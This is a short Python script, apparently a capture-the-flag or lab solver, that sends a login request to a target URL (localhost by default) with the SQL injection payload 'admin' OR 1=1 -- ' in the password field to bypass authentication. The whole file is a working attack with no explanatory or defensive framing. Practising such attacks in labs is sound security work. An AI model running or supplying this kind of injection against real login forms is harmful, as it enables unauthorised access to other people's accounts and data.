import requests
import sys

s = requests.Session()
url = sys.argv[1] if len(sys.argv) > 1 else 'http://localhost:1337'

r = s.post(url + "/login", data={"username": "admin", "password": "admin' OR 1=1 -- "})
print(r.text)
